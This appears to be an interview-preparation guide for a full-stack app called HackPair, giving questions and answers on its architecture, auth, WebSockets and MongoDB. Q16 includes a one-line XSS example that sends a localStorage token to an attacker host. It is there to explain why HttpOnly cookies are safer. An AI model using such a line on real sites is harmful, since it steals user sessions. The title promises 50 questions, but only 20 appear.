# Document 10: Comprehensive Technical Interview Preparation (50 Q&A)

This document contains 50 interview questions and senior-level answers directly tailored to the HackPair codebase.

---

## Category 1: Project Architecture & System Design

### Q1: Can you walk me through the overall architecture of HackPair?
**Answer:** HackPair is a decoupled full-stack web application. The frontend is built on Next.js 16 with the React 19 App Router, while the backend is an Express 5 and Node.js REST API wrapped inside an HTTP server that concurrently powers Socket.IO for WebSockets. Persistent storage is managed on MongoDB Atlas via Mongoose 9. Client-server communication is handled via an Axios client configured with `withCredentials: true` to seamlessly pass `HttpOnly` JWT session cookies. The backend also includes an asynchronous service layer utilizing Nodemailer and Resend for transactional email dispatching.
- **Follow-up:** *Why did you decouple frontend and backend into two separate codebases rather than using Next.js Server Actions or API routes?*
- **Follow-up Answer:** Decoupling ensures separation of concerns. While Next.js API routes are great for simple CRUD, WebSockets require persistent, long-lived TCP connections which are not supported on serverless platforms (e.g. Vercel). By maintaining a dedicated Node.js/Express server on persistent compute (Render/Railway), we can host Socket.IO rooms, connection states, and background email workers efficiently.

### Q2: How does the application handle asynchronous operations like email sending without degrading API latency?
**Answer:** In [`src/routes/requests.js`](file:///c:/Backend/hackpair-backend/src/routes/requests.js) and [`src/routes/auth.js`](file:///c:/Backend/hackpair-backend/src/routes/auth.js), email dispatch functions (`sendWelcomeEmail`, `sendConnectionRequestEmail`) are invoked in a fire-and-forget asynchronous pattern without `await`. The server immediately returns the JSON HTTP response to the client (e.g. `res.json(...)`), while the Node.js event loop handles the SMTP network call in the background with attached `.catch(...)` handlers to log any transport errors without crashing the process.
- **Follow-up:** *What is the risk of fire-and-forget in Node.js, and how would you scale it in a massive production environment?*
- **Follow-up Answer:** If the Node process crashes or restarts while an unawaited promise is in-flight, that email is lost. For high-volume production, I would introduce a durable message queue like **BullMQ with Redis** or AWS SQS. The route would simply enqueue a job in <5ms, and isolated background worker processes would consume jobs with retry mechanisms, exponential backoff, and dead-letter queues.

---

## Category 2: Frontend & React / Next.js Implementation

### Q3: How do you protect authenticated routes on the frontend?
**Answer:** Route protection is handled in [`DashboardShell`](file:///c:/personal-projects/hackpair-frontend/src/app/resources/components/dashboard/dashboard-shell/index.jsx), which wraps every authenticated page (`/feed`, `/requests`, `/connections`, `/chat`, `/profile`). On mount, an effect checks `!authLoading && !user`. If the user is unauthenticated, Next.js `useRouter().push("/login")` immediately redirects the user to the login portal. While auth status is verifying, a clean loading spinner is rendered.
- **Follow-up:** *Why not use Next.js `middleware.js` at the edge?*
- **Follow-up Answer:** Next.js edge middleware can inspect the incoming cookie and redirect before any HTML is rendered. In our architecture, the client relies on cross-origin cookies to an external backend; using client-side guarding in `DashboardShell` combined with server-side validation on every backend API call ensures security. Adding an edge `middleware.js` to pre-check the existence of the `token` cookie would be an excellent further optimization.

### Q4: How does `AuthContext` maintain session state without using `localStorage`?
**Answer:** On application load, [`AuthContext.jsx`](file:///c:/personal-projects/hackpair-frontend/src/context/AuthContext.jsx) dispatches `GET /profile/view`. Because Axios has `withCredentials: true`, the browser automatically transmits the `HttpOnly` JWT cookie. If the token is valid, the server returns the sanitized user profile, setting `user` state and `loading = false`. If the cookie is expired or missing, the 401 error sets `user = null`. This eliminates storing sensitive tokens in `localStorage`, protecting the app against XSS-based token theft.
- **Follow-up:** *Doesn't calling `/profile/view` on every load cause a brief loading flicker?*
- **Follow-up Answer:** It introduces a minor loading state during initial page hydration, which is handled gracefully by rendering an animated loading screen. The trade-off is well worth the massive security advantage of keeping tokens immune to JavaScript extraction.

### Q5: How is optimistic UI updating implemented in the feed?
**Answer:** In [`useFeed.js`](file:///c:/personal-projects/hackpair-frontend/src/hooks/use-feed.js), when a user clicks "Interested" or "Ignore", `setFeed((prev) => prev.filter((user) => user._id !== toUserId))` is called immediately before awaiting the backend response. This removes the candidate card instantly with zero lag, providing an intuitive, snappy user experience. If the API call fails, a toast notification alerts the user.

---

## Category 3: Backend & Express 5 Implementation

### Q6: What advantages did Express 5 provide over Express 4 in this project?
**Answer:** Express 5 provides native support for rejected promises in route handlers. In Express 4, unhandled promise rejections inside `async (req, res)` would hang the request or crash the process unless wrapped in explicit `try/catch` or helper wrappers (`express-async-errors`). Express 5 forwards unhandled rejections directly to the default error-handling middleware.

### Q7: How does your backend prevent Insecure Direct Object References (IDOR)?
**Answer:** In [`src/app.js`](file:///c:/Backend/hackpair-backend/src/app.js) and [`src/routes/profile.js`](file:///c:/Backend/hackpair-backend/src/routes/profile.js), mutating routes (`PATCH /profile/edit`, `DELETE /user/:userId`, `PATCH /user/:userId`) never trust client-supplied user IDs alone. In `deleteUserHandler`, the code explicitly checks:
```javascript
if (targetUserId.toString() !== req.user._id.toString()) {
    return res.status(403).send("Forbidden: You can only delete your own account");
}
```
Furthermore, `profileRouter.patch("/profile/edit")` operates strictly on `req.user`, meaning a user can only ever update their own verified session record.

### Q8: How is the whitelisting of profile update fields enforced?
**Answer:** In [`src/utils/validation.js`](file:///c:/Backend/hackpair-backend/src/utils/validation.js), `validateEditProfileData` defines an `ALLOWED_UPDATES` array:
`["firstName", "lastName", "photoUrl", "about", "gender", "age", "skills"]`.
Any request containing fields outside this list (e.g., trying to modify `email`, `password`, or `_id`) is immediately rejected with `HTTP 400 Bad Request`.

---

## Category 4: WebSockets & Real-Time Live Chat (Socket.IO)

### Q9: How does Socket.IO authenticate incoming WebSocket connections?
**Answer:** In [`src/utils/socket.js`](file:///c:/Backend/hackpair-backend/src/utils/socket.js), an `io.use(...)` middleware intercepts the handshake. It extracts the `token` from `socket.handshake.headers.cookie` (or `socket.handshake.auth.token`). It validates the JWT signature using `jwt.verify(token, JWT_SECRET)`, queries MongoDB for the user, and attaches `socket.user = user`. If verification fails, it calls `next(new Error("Authentication error"))`, terminating the connection before any events can fire.

### Q10: How do you ensure users can only message their confirmed connections?
**Answer:** Before a user can join a chat room or dispatch a message, the server checks the database:
```javascript
const isConnected = await ConnectionRequest.findOne({
    $or: [
        { fromUserId: socket.user._id, toUserId: targetUserId, status: "accepted" },
        { fromUserId: targetUserId, toUserId: socket.user._id, status: "accepted" },
    ],
});
if (!isConnected) return socket.emit("error", { message: "Cannot send message..." });
```
This guarantees that strangers cannot eavesdrop, spoof room IDs, or send unauthorized messages.

### Q11: How does the room ID generation work for private 1-on-1 chats?
**Answer:** It uses a deterministic pairing algorithm:
`const roomId = [userA.toString(), userB.toString()].sort().join("_");`
By sorting the two ObjectIds alphabetically, both User A and User B will always generate the exact same room string regardless of who initiated the conversation.

### Q12: How does the real-time unread badge update when a user is on a different page?
**Answer:** On socket connection, every user automatically joins their own personal room:
`socket.join(socket.user._id.toString());`.
When User A sends a message to User B, the server broadcasts `messageReceived` to the shared chat room, and concurrently emits `newUnreadMessage` directly to `io.to(targetUserId.toString())`. The `DashboardSidebar` component listens to this event and increments the unread badge in real time, even if User B is currently viewing `/feed`.

---

## Category 5: Database & Query Optimization (MongoDB)

### Q13: Explain the Feed exclusion query and its algorithmic complexity.
**Answer:** In [`src/routes/user.js`](file:///c:/Backend/hackpair-backend/src/routes/user.js), generating the feed requires hiding: (1) oneself, (2) users we already sent requests to, (3) users who sent requests to us, and (4) ignored users.
The query first retrieves all requests where `fromUserId: myId` or `toUserId: myId` selecting only `fromUserId toUserId`. It builds a `Set` of distinct IDs to hide, and then executes:
`User.find({ _id: { $nin: Array.from(hideUsersFromFeed) } }).select(...).skip(...).limit(...)`.
- **Follow-up:** *How does this perform as the user base scales to millions?*
- **Follow-up Answer:** Passing thousands of IDs inside a `$nin` array degrades query performance. At scale, this should be refactored into a MongoDB Aggregation Pipeline utilizing a `$lookup` join against the `connectionrequests` collection with an index scan on `{ fromUserId: 1, toUserId: 1 }`, or pre-computing feed recommendations into a Redis cache.

### Q14: Why did you use a compound index on `ConnectionRequest`?
**Answer:** Matchmaking checks frequently query both `fromUserId` and `toUserId` together:
`ConnectionRequest.findOne({ fromUserId, toUserId })`.
By defining `connectionRequestSchema.index({ fromUserId: 1, toUserId: 1 })`, MongoDB resolves the query via an efficient B-Tree index scan ($O(\log N)$) rather than scanning the entire collection ($O(N)$).

### Q15: How does the Chat model prevent document size bloat?
**Answer:** MongoDB documents have a 16MB BSON size limit. In our schema, messages are embedded inside the `Chat` document. Each message document is small (~100 bytes), allowing over 100,000 messages before approaching limits. For massive enterprise scale, messages can be moved to a standalone `messages` collection with pagination by `{ chatId, createdAt: -1 }`.

---

## Category 6: Authentication & Security Deep Dive

### Q16: Why are `HttpOnly` cookies safer than `localStorage` for JWT tokens?
**Answer:** `localStorage` is accessible to any JavaScript running on the page. If the application has a single Cross-Site Scripting (XSS) vulnerability (e.g. from an unescaped input or malicious third-party npm package), an attacker can execute `fetch("https://attacker.com?token=" + localStorage.getItem("token"))` and steal all user sessions. With `HttpOnly`, the browser blocks script access entirely, rendering XSS token theft impossible.

### Q17: How did you fix the critical password reset vulnerability?
**Answer:** The original endpoint allowed anyone with an email address to overwrite any password. I replaced it with a secure tokenized flow:
1. Generate 32 bytes of cryptographically secure random entropy (`crypto.randomBytes(32)`).
2. Store a SHA-256 hash of that token in MongoDB with a 15-minute expiration timestamp.
3. Send the raw token via email in a reset link.
4. When submitted, hash the incoming token and match against the unexpired DB record.
5. Return generic responses to prevent user enumeration.

---

## Category 7: Scenario & System Scaling Questions

### Q18: What happens if the database connection drops while the server is running?
**Answer:** In [`src/config/database.js`](file:///c:/Backend/hackpair-backend/src/config/database.js), Mongoose handles reconnection attempts automatically via its internal buffer queue. However, if unhandled, pending operations will timeout. In production, we should attach event listeners to `mongoose.connection.on("disconnected", ...)` and configure health probes so that orchestrators (e.g., Kubernetes or Docker) mark the container as unhealthy and restart it cleanly.

### Q19: How would you scale HackPair to handle 50,000 concurrent WebSocket users across multiple servers?
**Answer:** Currently, Socket.IO routes events through local server process memory. To scale horizontally across 10 or 20 servers behind an Application Load Balancer:
1. **Sticky Sessions**: Configure the load balancer for sticky cookies during initial HTTP long-polling handshake.
2. **Socket.IO Redis Adapter**: Install `@socket.io/redis-adapter` connected to a Redis cluster. When Server 1 emits a message, Redis Pub/Sub broadcasts the packet across all server nodes so User B connected to Server 3 receives it instantly.

### Q20: What happens if an attacker spams 1,000 connection requests per second?
**Answer:**
1. **Network Layer**: Cloudflare Edge intercepts anomalous request floods.
2. **Rate Limiting**: Express rate limiters throttle excessive traffic per IP.
3. **Database Guard**: The compound unique check and pre-save hook prevent duplicate or invalid records from entering the database.

